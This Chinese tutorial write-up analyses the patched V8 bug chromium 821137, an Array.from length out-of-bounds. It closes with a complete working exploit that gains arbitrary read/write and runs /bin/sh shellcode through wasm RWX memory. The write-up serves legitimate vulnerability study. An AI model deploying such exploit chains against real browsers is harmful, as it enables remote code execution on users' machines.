**作者： 天融信阿尔法实验室**  
**原文链接：<https://mp.weixin.qq.com/s/6qyBFmxsUny-s_FB4PemWg>**

最近笔者分析了一个chrome
v8引擎的漏洞chromium821137，虽然这是一个老的漏洞，但是从漏洞分析利用中我们还是可以学习到v8漏洞利用的一些基础知识，对于入门学习浏览器漏洞利用具有较高的研究价值。

### 环境搭建

#### 拉取代码

因为众所周知的原因，拉取v8代码需要使用非常规的方法，具体的搭建过程可以参考文末的链接。环境搭建和拉取旧的commit过程中我遇到的主要的坑是代理的问题，需要使用sock5全局代理，并且在使用谷歌的gclient
sync命令的时候需要在根目录写一个.boto的配置文件才能使之运行时使用配置的代理；另外一个很重要的点是linux要使用ubuntu的镜像（笔者使用的是ubuntu
18.04），使用其他发行版可能会遇到奇奇怪怪意想不到的问题。大家在配置的过程如果遇到问题可以查找是不是上述步骤出现问题。

#### 调试环境搭建

v8调试环境可以使用v8安装目录下的/tools/gdbinit并将它加入根目录下.gdbinit配置里，修改.gdbinit配置

    
    
    sudo gedit ~/.gdbinit

添加配置（可以配合其他gdb插件如pwndbg使用），

    
    
    source path/to/gdbinit

使用gdb调试时可以先加载要调试的d8文件，然后设置启动参数

    
    
    set args --allow-natives-syntax xxx.js

其中xxx.js可以在要调试的地方设置输出点和断点

    
    
    %DebugPrint(obj)    // 输出对象地址
    %SystemBreak()      // 触发调试中断

在gdb中使用job addr命令可以很清晰的看到addr处的数据结构。

#### 漏洞环境搭建

我们从漏洞的issue链接<https://bugs.chromium.org/p/chromium/issues/detail?id=821137>找到修复的commit链接<https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d>，可以看到漏洞信息、存在漏洞的上一个版本（parent）、diff修复信息和漏洞poc（[test/mjsunit/regress/regress-821137.js](https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d/test/mjsunit/regress/regress-821137.js)）

![](https://images.seebug.org/content/images/2020/03/60d5110d-bf5a-4ddd-90cf-8ae109e611e1.png-w331s)

回退到漏洞存在的commit，分别编译debug和release版。（其中ninja构建系统是非google系的，需要自行安装，可以参考v8环境搭建的链接）

    
    
    git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599
    gclient sync
    tools/dev/v8gen.py x64.debug 
    ninja -C out.gn/x64.debug d8
    
    tools/dev/v8gen.py x64.relase
    ninja -C out.gn/x64.relase d8

### 漏洞分析

我们从poc出发来分析漏洞的原理，poc如下

    
    
    let oobArray = [];
    let maxSize = 1028 * 8;
    Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => (
      {
        counter : 0,
        next() {
          let result = this.counter++;
          if (this.counter > maxSize) {
            oobArray.length = 0;
            return {done: true};
          } else {
            return {value: result, done: false};
          }
        }
      }
    ) });
    oobArray[oobArray.length - 1] = 0x41414141;

poc主要是定义了一个数组和一个smi（small
int）值，然后调用了一个方法Array.from.call，最后给定义的数组偏移[长度-1]的位置赋值时v8崩溃了。

poc中Array.from.call这个方法需要关注下，Array是一个js数据类型，from是Array类型的一个方法，Array.from整体相当于一个function，这个function又调用了call方法，这是js的一种调用方式Function.prototype.call()，语法是function.call(thisArg,
arg1, arg2,
...)。通过搜索MDN了解到Function.prototype.call()可以使用一个指定的this值和单独给出的一个或多个参数来调用一个函数即Function，而且参数可以是一个参数列表。

凭经验我们可以猜到应该是Array.from方法出现了问题，我们在/v8/src/目录下查找问题代码。（PS:v8的js函数实现方法一般在src目录下，搜索命令中r表示递归查找，R表示查找包含子目录的所有文件，n表示显示出现的行数）

    
    
    r00t@5n1p3r0010:~$ grep -rRn "array\.from" -r /home/r00t/v8/src/
    /home/r00t/v8/src/builtins/builtins-definitions.h:245:  /* ES6 #sec-array.from */                                                    \
    /home/r00t/v8/src/builtins/builtins-array-gen.cc:1996:// ES #sec-array.from

找到Array.from方法实现的位置和行数/home/r00t/v8/src/builtins/builtins-array-gen.cc:1996://
ES #sec-array.from并跟进。

v8中js原生函数的实现是用`c++`写的，为了在各种cpu架构下做到性能优化的极致，google把这些重载过的`c++`代码实现的js原型函数用汇编器CodeStubAssembler生成了汇编代码。重载过的`c++`代码根据函数名字能大致猜到函数的功能（分析这个漏洞我们可以暂时不把主要精力放在分析这些重载的方法上，当然你要是像lokihardt那样“看一眼函数名字就知道哪有漏洞”当我没说;），其中一些常用的重载方法如下

    
    
    label   定义和bind绑定的标签
    bind    绑定声明的label和代码块，bind绑定的代码块并不以{}作为分割，绑定的是两个bind或者bind到当前函数结束之间的代码
    goto    跳转到代码块执行
    branch  相当于if的三目运算，即if(flag)? a;b，根据条件flag是否成立跳转到指定的label代码块a或b

我们来分析一下v8的array.from实现，

    
    
    TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) {
      TNode<Context> context = CAST(Parameter(BuiltinDescriptor::kContext));
      TNode<Int32T> argc =
          UncheckedCast<Int32T>(Parameter(BuiltinDescriptor::kArgumentsCount));
    
      CodeStubArguments args(this, ChangeInt32ToIntPtr(argc));
    
      TNode<Object> map_function = args.GetOptionalArgumentValue(1);
    
      // If map_function is not undefined, then ensure it's callable else throw.
      //判断arg[1]即mapFn类型是否为undefined、smi、callable，否则报错
      {
        Label no_error(this), error(this);
        GotoIf(IsUndefined(map_function), &no_error);
        GotoIf(TaggedIsSmi(map_function), &error);
        Branch(IsCallable(map_function), &no_error, &error);
    
        BIND(&error);
        ThrowTypeError(context, MessageTemplate::kCalledNonCallable, map_function);
    
        BIND(&no_error);
      }

首先判断了arg[1]的类型，我们通过查找MDN得知array.from的函数原型是Array.from(arrayLike[, mapFn[,
thisArg]])，所以这里的arg[1]对应mapFn，同理GetOptionalArgumentValue()得到的其他参数对应方式类似。

    
    
      //判断[symbol.iterator]方法是否定义
      IteratorBuiltinsAssembler iterator_assembler(state());
      Node* iterator_method =
          iterator_assembler.GetIteratorMethod(context, array_like);
      Branch(IsNullOrUndefined(iterator_method), &not_iterable, &iterable);
    
      //使用自定义的[symbol.iterator]方法
      BIND(&iterable);
      {
        TVARIABLE(Number, index, SmiConstant(0));//定义Number类型变量index，值为0
        TVARIABLE(Object, var_exception);
        Label loop(this, &index), loop_done(this),
            on_exception(this, Label::kDeferred),
            index_overflow(this, Label::kDeferred);
    
        // Check that the method is callable.
        //判断自定义的[symbol.iterator]方法是否是callable类型
        {
          Label get_method_not_callable(this, Label::kDeferred), next(this);
          GotoIf(TaggedIsSmi(iterator_method), &get_method_not_callable);
          GotoIfNot(IsCallable(iterator_method), &get_method_not_callable);
          Goto(&next);
    
          BIND(&get_method_not_callable);
          ThrowTypeError(context, MessageTemplate::kCalledNonCallable,
                         iterator_method);
    
          BIND(&next);
        }
    
        // Construct the output array with empty length.
        //创建length为empty的数组
        array = ConstructArrayLike(context, args.GetReceiver());
    
        // Actually get the iterator and throw if the iterator method does not yield
        // one.
        IteratorRecord iterator_record =
            iterator_assembler.GetIterator(context, items, iterator_method);
    
        TNode<Context> native_context = LoadNativeContext(context);
        TNode<Object> fast_iterator_result_map =
            LoadContextElement(native_context, Context::ITERATOR_RESULT_MAP_INDEX);
    
        Goto(&loop);

然后判断array.from的第一个参数是否定义了迭代器方法iterator，若iterator方法非undefined、null使用自定义的迭代器方法，poc中的数组oobArray定义了iterator，会执行BIND(&iterable)中的代码。这里需要关注的一点是在执行自定义的iterator时使用了变量index去记录迭代的次数。在判断完iterator方法是否是callable类型后poc中的代码会执行BIND(&next)处的代码，在next中首先创建了一个长度为0的数组，然后跳转到loop处继续执行。

BIND(&loop)主要是调用CallJS执行了自定义的Array.from(arrayLike[, mapFn[,
thisArg]])中的mapFn方法，返回值存储在thisArg中，并用index记录迭代的次数。

    
    
        ......
        BIND(&loop_done);
        {
          length = index;
          Goto(&finished);
        }
        ......
          BIND(&finished);
    
      // Finally set the length on the output and return it.
      GenerateSetLength(context, array.value(), length.value());
      args.PopAndReturn(array.value());
    }

iterator执行完成之后会跳转到loop_done处，index的value赋值给length，继续跳转到finished处。在finished处调用了GenerateSetLength设置生成的array的长度，注意这里的第三个参数length.value()实际上是自定义的iterator执行的次数。

继续跟进GenerateSetLength

    
    
        BranchIfFastJSArray(array, context, &fast, &runtime);
    
        BIND(&fast);
        {
          TNode<JSArray> fast_array = CAST(array);
    
          TNode<Smi> length_smi = CAST(length);
          TNode<Smi> old_length = LoadFastJSArrayLength(fast_array);
          CSA_ASSERT(this, TaggedIsPositiveSmi(old_length));
    
          // 2) Ensure that the length is writable.
          // TODO(delphick): This check may be redundant due to the
          // BranchIfFastJSArray above.
          EnsureArrayLengthWritable(LoadMap(fast_array), &runtime);
    
          // 3) If the created array already has a length greater than required,
          //    then use the runtime to set the property as that will insert holes
          //    into the excess elements and/or shrink the backing store.
          GotoIf(SmiLessThan(length_smi, old_length), &runtime);
    
          StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,
                                         length_smi);
    
          Goto(&done);
        }

在GenerateSetLength中首先判断了array是否包含fast
elements(具体快元素和字典元素的区别可以查阅参考链接)。poc中oobarray不包含configurable为false的元素是快元素，执行BIND(&fast)的代码。在fast中把GenerateSetLength的第三个参数length转化赋值给length_smi，array的length转化赋值给old_length，然后比较length_smi和old_length的大小，若length_smi小于old_length则进行内存缩减跳转到runtime设置array的length为length_smi。

代码的逻辑看起来似乎没问题，就是对Array.from(arrayLike[, mapFn[,
thisArg]])方法中的arrayLike对象执行自定义的迭代方法index次，创建一个空的array并在执行自定义迭代方法时设置它的长度为index.value，并最后检查根据index.value是否小于array的实际长度来决定设置array的长度为index.value或实际长度。但开发者似乎忽略了一个问题就是迭代方法是我们自己定义的，我们可以在迭代方法中设置Array.from(arrayLike[,
mapFn[,
thisArg]])中arrayLike对象的实际长度；如poc中我们在最后一轮迭代时设置oobArray的实际长度为0，在执行完maxSize次迭代后调用GenerateSetLength，这时oobArray迭代次数index>设置的实际长度0，并不会跳转到runtime设置oobArray的长度为我们设置的实际长度0，这样我们在实际长度为0的oobArray里拥有迭代次数index大小长度的访问权，就造成了越界访问。

patch中修改SmiLessThan为SmiNotEqual，这样在迭代次数>迭代函数中设置的实际长度时也会跳转到runtime执行设置数组的长度为迭代函数中设置的实际长度，就避免了oob的发生。

    
    
    -      // 3) If the created array already has a length greater than required,
    +      // 3) If the created array's length does not match the required length,
           //    then use the runtime to set the property as that will insert holes
    -      //    into the excess elements and/or shrink the backing store.
    -      GotoIf(SmiLessThan(length_smi, old_length), &runtime);
    +      //    into excess elements or shrink the backing store as appropriate.
    +      GotoIf(SmiNotEqual(length_smi, old_length), &runtime);

### v8数据存储形式

在js中number都是double型的，v8为了节约存储内存和加快性能，实现的时候加了smi（small
int）型。32位系统中smi的范围是31位有符号数，64位smi范围是32位带符号数。大于2^32 v8会用float存储整型。

为了加快垃圾回收的效率需要区分number和指针，v8的做法是使用低位为标志位对它们进行区分。由于32位、64位系统的指针会字节对齐，指针的最低位一定为0，v8利用这一点最低位为1视为指针，最低位为0视为number，smi在32位系统中只有高31位是有效数据位。

### 漏洞利用

#### 总体思路

通过前面的分析我们得知这是一个越界访问漏洞，如果我们想通过这个越界访问漏洞达到任意代码执行的效果，容易想到的一种方式是通过越界访问达到任意地址写，再到劫持控制流进而任意代码执行。

#### 任意地址写

v8中达到任意地址读写的方法一般是控制一个JSArrayBuffer对象，之后的分析我们会看到JSArrayBuffer对象有一个成员域backing_store，backing_store指向初始化JSArrayBuffer时用户申请大小的堆，如果我们控制了一个JSArrayBuffer相当于一个指针和指针的内容可以同时改写。这样我们改写backing_store读取控制的JSArrayBuffer的内容就是任意地址读；我们改写backing_store修改控制的JSArrayBuffer的内容就是任意地址写。

#### 获得可控JSArrayBuffer

接下来的问题是如何得到可控的JSArrayBuffer对象，因为我们最后的目的是使得JSArrayBuffer的backing_store指针和指针的内容可写，所以这里需要JSArrayBuffer落到一个释放的oobArray里，这一步可以通过gc实现。触发gc可以通过删除对象引用实现，需要注意的一点是为了避免oobArray被gc完全回收，在最后一轮迭代后要设置oobArray.length为大于0的数如1。

    
    
    /*generate a Out-Of-Bound array and generate many ArrayBuffers and objects*/
    var bufArray = [];
    var objArray = [];
    var oobArray = [1.1];
    var maxSize = 8224;
    function objGen(tag){
        this.leak = 0x1234;
        this.tag = tag;
    }
    Array.from.call(function() { return oobArray }, {[Symbol.iterator] : x => (
        {
            counter : 0,
            next() {
            let result = 1.1;
            this.counter++;
            if (this.counter > maxSize) {
                oobArray.length = 1;
                bufArray.push(new ArrayBuffer(0xbeef));
                objArray.push(new objGen(0xdead));
                return {done: true};
            } else {
                return {value: result, done: false};
            }
            }
        }
    ) });
    
    for(let x=0; x<=maxSize; x++) {let y = oobArray[x]}; //trigger the GC

#### 信息泄露

gc触发之后某个JSArrayBuffer会落在某个oobArray里，下一步就是确定JSArrayBuffer对象和用于泄露信息的objGen的位置。这里可以通过搜索自定义的标志位0xbeef和0xdead实现，

    
    
    for(let i = 0; i < maxSize; i++){
        let val = dt.f2i(oobArray[i]);
        if(0xbeef00000000===val){
            offsetBuf = i-3;
            console.log("buf offset: " + offsetBuf);
        }
        if(0xdead00000000===val){
            offsetObjLeak = i-1;
            console.log("objGen.leak offset: " + offsetObjLeak);
            break;
        }
    }

其中JSArrayBuffer和objGen在内存中的存储如下

    
    
    DebugPrint: 0x155d775640a9: [JSArray]
     - map: 0x27e8a9702729 <Map(PACKED_ELEMENTS)> [FastProperties]
     - prototype: 0x37429d985539 <JSArray[0]>
     - elements: 0x155d775640c9 <FixedArray[3]> [PACKED_ELEMENTS]
     - length: 3
     - properties: 0x1c4546382251 <FixedArray[0]> {
        #length: 0x1c45463cff89 <AccessorInfo> (const accessor descriptor)
     }
     - elements: 0x155d775640c9 <FixedArray[3]> {
               0: 0x317427c912b1 <JSArray[8224]>
               1: 0x317427c91269 <JSArray[1]>
               2: 0x317427c91239 <JSArray[1]>
     }
    pwndbg> job 0x317427c91269
    0x317427c91269: [JSArray]
     - map: 0x27e8a9702729 <Map(PACKED_ELEMENTS)> [FastProperties]
     - prototype: 0x37429d985539 <JSArray[0]>
     - elements: 0x155d77563fb9 <FixedArray[17]> [PACKED_ELEMENTS]
     - length: 1
     - properties: 0x1c4546382251 <FixedArray[0]> {
        #length: 0x1c45463cff89 <AccessorInfo> (const accessor descriptor)
     }
     - elements: 0x155d77563fb9 <FixedArray[17]> {
               0: 0x155d77563ec9 <objGen map = 0x27e8a970d519>
            1-16: 0x1c4546382321 <the_hole>
     }
    pwndbg> x/10xg 0x155d77563ec9-1
    0x155d77563ec8: 0x000027e8a970d519  0x00001c4546382251
    0x155d77563ed8: 0x00001c4546382251  0x0000123400000000
    0x155d77563ee8: 0x0000dead00000000  //flag  0x0000282d394823b9
    0x155d77563ef8: 0x0000282d394823b9  0x0000282d394823b9
    0x155d77563f08: 0x0000282d394823b9  0x0000282d394823b9
    
    
    pwndbg> job 0x317427c91239
    0x317427c91239: [JSArray]
     - map: 0x27e8a9702729 <Map(PACKED_ELEMENTS)> [FastProperties]
     - prototype: 0x37429d985539 <JSArray[0]>
     - elements: 0x155d77563d29 <FixedArray[17]> [PACKED_ELEMENTS]
     - length: 1
     - properties: 0x1c4546382251 <FixedArray[0]> {
        #length: 0x1c45463cff89 <AccessorInfo> (const accessor descriptor)
     }
     - elements: 0x155d77563d29 <FixedArray[17]> {
               0: 0x155d77563cd9 <ArrayBuffer map = 0x27e8a9703fe9>
            1-16: 0x1c4546382321 <the_hole>
     }
    pwndbg> job 0x155d77563cd9
    0x155d77563cd9: [JSArrayBuffer]
     - map: 0x27e8a9703fe9 <Map(HOLEY_ELEMENTS)> [FastProperties]
     - prototype: 0x37429d992981 <Object map = 0x27e8a9704041>
     - elements: 0x1c4546382251 <FixedArray[0]> [HOLEY_ELEMENTS]
     - embedder fields: 2
     - backing_store: 0x55cf2f44a130
     - byte_length: 48879
     - neuterable
     - properties: 0x1c4546382251 <FixedArray[0]> {}
     - embedder fields = {
        (nil)
        (nil)
     }
    pwndbg> x/10xg 0x155d77563cd9-1
    0x155d77563cd8: 0x000027e8a9703fe9  0x00001c4546382251
    0x155d77563ce8: 0x00001c4546382251  0x0000beef00000000  //flag
    0x155d77563cf8: 0x000055cf2f44a130  0x000055cf2f44a130
    0x155d77563d08: 0x000000000000beef  0x0000000000000004
    0x155d77563d18: 0x0000000000000000  0x0000000000000000
    pwndbg> x/10xg 0x55cf2f44a130-0x10  //backing_store指向内存区，chunk size=0xbf01，申请0xbeef，字节对齐后0xbef0+0x11
    0x55cf2f44a120: 0x0000000000000000  0x000000000000bf01
    0x55cf2f44a130: 0x0000000000000000  0x0000000000000000
    0x55cf2f44a140: 0x0000000000000000  0x0000000000000000
    0x55cf2f44a150: 0x0000000000000000  0x0000000000000000
    0x55cf2f44a160: 0x0000000000000000  0x0000000000000000

#### 利用wasm执行任意代码

搜索得到可控的JSArrayBuffer对象后就获得了任意地址读写的能力，任意代码执行可以通过堆利用中常规的构造unsorted
bin泄露libc，进而修改malloc_hook劫持控制流；对于v8也可以通过wasm获得一块rwx的内存，把shellcode写进这块内存再调用wasm的接口就可以执行shellcode了。

我们实例化一个wasm的对象funcAsm，通过读取前面控制的JSArrayBuffer的内容可以得到funcAsm的地址。funcAsm实际上是一个JSFunction类型的对象，实际执行的代码位于一块rwx的内存中，通过任意地址写修改这块rwx内存的内容再调用funcAsm就可以执行任意代码了。

    
    
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule, {});
    var funcAsm = wasmInstance.exports.main;
    
    var addressFasm = addressOf(funcAsm);

不同版本的v8中这块rwx的内存位置可能不同，在这个版本中调试发现位于wasmInstance.exports.main->shared_info->code->code+0x70的位置。

    
    
    sharedInfo: 33498958838225
    codeAddr: 52817528690241
    memoryRWX: 0x00002dd1ea0ae000
    0x1e77958abae1 <JSFunction 0 (sfi = 0x1e77958ab9d1)>
    
    pwndbg> x/20xg 0x30098A091641-1
    0x30098a091640: 0x00003556529828e1  0x00001e77958ab781
    0x30098a091650: 0x00003a9562c02251  0x00003a9562c02661
    0x30098a091660: 0x00001e77958ab799  0x0000049000000043
    0x30098a091670: 0x000000000000002c  0xffffffff00000000
    0x30098a091680: 0xffffffff00000000  0x0000000000000000
    0x30098a091690: 0x0000000000000000  0x0000000000000000
    0x30098a0916a0: 0xbe485756e5894855  0x00005556054ee6f0
    0x30098a0916b0: 0x2dd1ea0ae000ba49  //rwx   0xe0c148d2ff410000
    0x30098a0916c0: 0x0008c25de58b4820  0x00000001001f0f90
    0x30098a0916d0: 0x0000001d00000003  0xffffffff0fffffff
    pwndbg> vmmap 0x00002dd1ea0ae000
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        0x2dd1ea0ae000     0x2dd1ea0af000 rwxp     1000 0 

### 完整exp

代码来源<https://www.sunxiaokong.xyz/2020-01-16/lzx-roll-a-d8/>

    
    
    var isdebug=1;
    function dp(...obj){
        if(isdebug){
            for(let i=0;obj[i];i++){
                %DebugPrint(obj[i]);
            }
        }   
        %SystemBreak();
    }
    
    class typeConvert{
        constructor(){
            this.buf = new ArrayBuffer(8);
            this.f64 = new Float64Array(this.buf);
            this.u32 = new Uint32Array(this.buf);
            this.bytes = new Uint8Array(this.buf);
        }
        //convert float to int
        f2i(val){       
            this.f64[0] = val;
            let tmp = Array.from(this.u32);
            return tmp[1] * 0x100000000 + tmp[0];
        }   
        /*
        convert int to float
        if nead convert a 64bits int to float
        please use string like "deadbeefdeadbeef"
        (v8's SMI just use 56bits, lowest 8bits is zero as flag)
        */
        i2f(val){
            let vall = hex(val);
            let tmp = [];
            tmp[0] = vall.slice(10, );
            tmp[1] = vall.slice(2, 10);
            tmp[0] = parseInt(tmp[0], 16);
            tmp[1] = parseInt(tmp[1], 16);
            this.u32.set(tmp);
            return this.f64[0];
        }
    }
    //convert number to hex string
    function hex(x)
    {
        return '0x' + (x.toString(16)).padStart(16, 0);
    }
    
    var dt = new typeConvert();
    
    /*generate a Out-Of-Bound array and generate many ArrayBuffers and objects*/
    var bufArray = [];
    var objArray = [];
    var oobArray = [1.1];
    var maxSize = 8224;
    function objGen(tag){
        this.leak = 0x1234;
        this.tag = tag;
    }
    Array.from.call(function() { return oobArray }, {[Symbol.iterator] : x => (
        {
            counter : 0,
            next() {
            let result = 1.1;
            this.counter++;
            if (this.counter > maxSize) {
                oobArray.length = 1;
                bufArray.push(new ArrayBuffer(0xbeef));
                objArray.push(new objGen(0xdead));
                return {done: true};
            } else {
                return {value: result, done: false};
            }
            }
        }
    ) });
    
    /*------search a ArrayBuffer which could be controlled by oobArray-------*/
    var offsetBuf; //target offset of oobArray
    var indexBuf;  //target offset in bufArray
    
    //dp(oobArray,objArray,bufArray);
    
    for(let x=0; x<=maxSize; x++) {let y = oobArray[x]}; //trigger the GC
    //search obj&JSArray offset
    for(let i = 0; i < maxSize; i++){
        let val = dt.f2i(oobArray[i]);
        if(0xbeef00000000===val){
            offsetBuf = i-3;
            console.log("buf offset: " + offsetBuf);
        }
        if(0xdead00000000===val){
            offsetObjLeak = i-1;
            console.log("objGen.leak offset: " + offsetObjLeak);
            break;
        }
    }
    
    //dp(oobArray,objArray,bufArray);
    
    function addressOf(target){
        objArray[0].leak = target;
        return dt.f2i(oobArray[offsetObjLeak]);
    }
    
    /*---------------------arbitrary address read / write--------------------*/
    // arbitrary address write
    var dtView = new DataView(bufArray[0]);
    function write64(addr, value){
        oobArray[offsetBuf+4] = dt.i2f(addr);
        dtView.setFloat64(0, dt.i2f(value), true);
    }
    // arbitrary address read
    function read64(addr, str=false){
        oobArray[offsetBuf+4] = dt.i2f(addr);
        let tmp = ['', ''];
        let tmp2 = ['', ''];
        let result = ''
        tmp[1] = hex(dtView.getUint32(0)).slice(10,);
        tmp[0] = hex(dtView.getUint32(4)).slice(10,);
        for(let i=3; i>=0; i--){
            tmp2[0] += tmp[0].slice(i*2, i*2+2);
            tmp2[1] += tmp[1].slice(i*2, i*2+2);
        }
        result = tmp2[0]+tmp2[1]
        if(str==true){return '0x'+result}
        else {return parseInt(result, 16)};
    
    }
    
    /*-------------------------use wasm to execute shellcode------------------*/
    var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,
        127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,
        1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,
        0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,10,11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule, {});
    var funcAsm = wasmInstance.exports.main;
    
    //dp(funcAsm);
    
    var addressFasm = addressOf(funcAsm);
    console.log("addressFasm: "+addressFasm);
    var sharedInfo = read64(addressFasm+0x18-0x1);
    console.log("sharedInfo: "+sharedInfo);
    var codeAddr = read64(sharedInfo+0x8-0x1);
    console.log("codeAddr: "+codeAddr);
    var memoryRWX = (read64(codeAddr+0x70-0x1)/0x10000);
    memoryRWX = Math.floor(memoryRWX);
    console.log("memoryRWX: "+hex(memoryRWX));
    
    //dp(funcAsm);
    
    //sys_execve('/bin/sh')
    var shellcode = [
        '2fbb485299583b6a',
        '5368732f6e69622f',
        '050f5e5457525f54'
    ];
    //write shellcode into RWX memory
    var offsetMem = 0;
    for(x of shellcode){
        write64(memoryRWX+offsetMem, x);
        offsetMem+=8;
    }
    //call funcAsm() and it would execute shellcode actually
    funcAsm();

### 总结

这篇文章分析了chromium821137漏洞的原理，介绍了v8的一些基础数据结构，并通过chromium821137学习了v8利用的基础知识，希望读者通过阅读调试能有所收获。

### 参考链接

  1. <https://bugs.chromium.org/p/chromium/issues/detail?id=821137>

  2. <https://www.cnblogs.com/snip3r/p/12290133.html>

  3. <https://blog.crimx.com/2018/11/25/v8-fast-properties/>

  4. <https://zhuanlan.zhihu.com/p/28780798>

  5. <http://www.jayconrod.com/posts/55/a-tour-of-v8-garbage-collection>

  6. <https://www.sunxiaokong.xyz/2020-01-16/lzx-roll-a-d8/>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1145/>

